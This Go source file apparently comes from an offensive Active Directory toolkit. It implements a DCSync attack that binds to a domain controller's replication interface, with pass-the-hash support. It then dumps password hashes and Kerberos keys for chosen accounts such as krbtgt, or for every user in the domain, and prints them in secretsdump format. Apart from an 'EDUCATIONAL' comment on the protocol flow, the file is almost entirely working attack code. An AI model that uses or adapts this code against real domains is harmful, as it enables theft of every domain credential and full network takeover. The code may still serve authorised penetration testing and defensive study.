package dcsync

import (
	"context"
	"encoding/hex"
	"fmt"
	"strings"
)

// DCSyncRequest configures a DCSync operation.
type DCSyncRequest struct {
	// Target DC
	DC     string
	Domain string

	// Authentication
	Username string
	Password string
	NTHash   []byte // Pass-the-hash

	// What to dump
	TargetUser string // Specific user (e.g., "krbtgt", "Administrator")
	TargetDN   string // Or full DN

	// Options
	JustNTLM bool // Only dump NTLM hash (faster)
}

// DCSyncResult contains extracted credentials.
type DCSyncResult struct {
	// User info
	SAMAccountName string
	UserPrincipal  string
	DN             string
	ObjectSID      string

	// Credentials
	NTHash  []byte // NTLM hash
	LMHash  []byte // LM hash (usually empty)
	AES256  []byte // AES256-CTS-HMAC-SHA1-96
	AES128  []byte // AES128-CTS-HMAC-SHA1-96
	DESKeys []byte // Legacy DES keys

	// Metadata
	PwdLastSet      int64
	UAC             uint32
	SupplementalRaw []byte // Raw supplemental credentials
}

// String returns a secretsdump.py-style output.
// Format: name:rid:lmhash:nthash:::
func (r *DCSyncResult) String() string {
	// Extract RID from SID
	rid := "0"
	if r.ObjectSID != "" {
		parts := strings.Split(r.ObjectSID, "-")
		if len(parts) > 0 {
			rid = parts[len(parts)-1]
		}
	}

	// LM hash (usually empty)
	lm := "aad3b435b51404eeaad3b435b51404ee"
	if len(r.LMHash) == 16 {
		lm = hex.EncodeToString(r.LMHash)
	}

	// NT hash
	nt := "31d6cfe0d16ae931b73c59d7e0c089c0"
	if len(r.NTHash) == 16 {
		nt = hex.EncodeToString(r.NTHash)
	}

	return fmt.Sprintf("%s:%s:%s:%s:::", r.SAMAccountName, rid, lm, nt)
}

// KeysString returns Kerberos keys in secretsdump format.
func (r *DCSyncResult) KeysString() string {
	var sb strings.Builder

	if len(r.AES256) == 32 {
		sb.WriteString(fmt.Sprintf("%s:aes256-cts-hmac-sha1-96:%s\n",
			r.SAMAccountName, hex.EncodeToString(r.AES256)))
	}
	if len(r.AES128) == 16 {
		sb.WriteString(fmt.Sprintf("%s:aes128-cts-hmac-sha1-96:%s\n",
			r.SAMAccountName, hex.EncodeToString(r.AES128)))
	}
	if len(r.DESKeys) > 0 {
		sb.WriteString(fmt.Sprintf("%s:des-cbc-md5:%s\n",
			r.SAMAccountName, hex.EncodeToString(r.DESKeys)))
	}

	return sb.String()
}

// DCSync performs a DCSync attack to extract credentials.
//
// EDUCATIONAL: DCSync Protocol Flow
//
//  1. RPC Bind to drsuapi interface (UUID: e3514235-4b06-11d1-ab04-00c04fc2dcd2)
//  2. DsBind - Get replication handle (DRS_HANDLE)
//  3. DsCrackNames - Resolve target to DN (if needed)
//  4. DsGetNCChanges - Request replication of user's secrets
//  5. Decrypt - Use session key to decrypt password data
//
// The secrets are in these attributes:
//   - unicodePwd: NTLM hash (encrypted)
//   - dBCSPwd: LM hash (encrypted)
//   - supplementalCredentials: Kerberos keys, cleartext, etc.
func DCSync(ctx context.Context, req *DCSyncRequest) (*DCSyncResult, error) {
	if req.DC == "" {
		return nil, fmt.Errorf("DC hostname required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain required")
	}
	if req.TargetUser == "" && req.TargetDN == "" {
		return nil, fmt.Errorf("target user or DN required")
	}

	fmt.Printf("[*] Connecting to DC: %s\n", req.DC)

	// Create DRSR client
	client, err := NewDRSRClient(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DRSR: %w", err)
	}
	defer client.Close()

	fmt.Println("[+] Connected to DRSR interface")

	// Bind to get replication handle
	fmt.Println("[*] Calling DsBind...")
	err = client.Bind(ctx)
	if err != nil {
		return nil, fmt.Errorf("DsBind failed: %w", err)
	}
	fmt.Println("[+] Got DRS handle")

	// Resolve target user to GUID using CrackNames
	var targetGUID string
	fmt.Printf("[*] Resolving %s...\n", req.TargetUser)
	targetGUID, err = client.CrackName(ctx, req.TargetUser)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve user: %w", err)
	}
	fmt.Printf("[+] Got GUID: %s\n", targetGUID)

	// Request replication of the user's secrets
	fmt.Printf("[*] Calling DsGetNCChanges for secrets...\n")
	result, err := client.GetNCChanges(ctx, targetGUID)
	if err != nil {
		return nil, fmt.Errorf("DsGetNCChanges failed: %w", err)
	}

	fmt.Println("[+] Successfully extracted credentials!")

	return result, nil
}

// DCSyncMultiple dumps multiple users using a single connection (efficient)
func DCSyncMultiple(ctx context.Context, req *DCSyncRequest, users []string) ([]*DCSyncResult, error) {
	if req.DC == "" {
		return nil, fmt.Errorf("DC hostname required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain required")
	}

	fmt.Printf("[*] Connecting to DC: %s\n", req.DC)

	// Create DRSR client ONCE
	client, err := NewDRSRClient(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DRSR: %w", err)
	}
	defer client.Close()

	fmt.Println("[+] Connected to DRSR interface")

	// Bind ONCE
	fmt.Println("[*] Calling DsBind...")
	err = client.Bind(ctx)
	if err != nil {
		return nil, fmt.Errorf("DsBind failed: %w", err)
	}
	fmt.Println("[+] Got DRS handle")
	fmt.Println()

	results := make([]*DCSyncResult, 0, len(users))

	// Dump each user using the same connection
	for _, user := range users {
		result, err := dumpUserWithClient(ctx, client, user)
		if err != nil {
			fmt.Printf("[!] Failed to dump %s: %v\n", user, err)
			continue
		}
		results = append(results, result)
		fmt.Print(result.String())
		fmt.Println()
	}

	return results, nil
}

// dumpUserWithClient dumps a single user using an existing client connection
func dumpUserWithClient(ctx context.Context, client *DRSRClient, user string) (*DCSyncResult, error) {
	// Resolve user to GUID
	targetGUID, err := client.CrackName(ctx, user)
	if err != nil {
		return nil, fmt.Errorf("failed to resolve user: %w", err)
	}

	// Get credentials
	result, err := client.GetNCChanges(ctx, targetGUID)
	if err != nil {
		return nil, fmt.Errorf("GetNCChanges failed: %w", err)
	}

	return result, nil
}

// DCSyncAll performs full NC replication to get ALL user credentials.
// This is the secretsdump.py approach - replicate entire domain at once.
func DCSyncAll(ctx context.Context, req *DCSyncRequest) ([]*DCSyncResult, error) {
	if req.DC == "" {
		return nil, fmt.Errorf("DC hostname required")
	}
	if req.Domain == "" {
		return nil, fmt.Errorf("domain required")
	}

	fmt.Printf("[*] Connecting to DC: %s\n", req.DC)

	// Create DRSR client
	client, err := NewDRSRClient(ctx, req)
	if err != nil {
		return nil, fmt.Errorf("failed to connect to DRSR: %w", err)
	}
	defer client.Close()

	fmt.Println("[+] Connected to DRSR interface")

	// Bind to get replication handle
	fmt.Println("[*] Calling DsBind...")
	err = client.Bind(ctx)
	if err != nil {
		return nil, fmt.Errorf("DsBind failed: %w", err)
	}
	fmt.Println("[+] Got DRS handle")
	fmt.Println()

	// Full NC replication
	fmt.Println("[*] Replicating entire Naming Context...")
	results, err := client.ReplicateNC(ctx)
	if err != nil {
		return nil, fmt.Errorf("NC replication failed: %w", err)
	}

	fmt.Printf("[+] Extracted %d user credentials\n", len(results))

	return results, nil
}
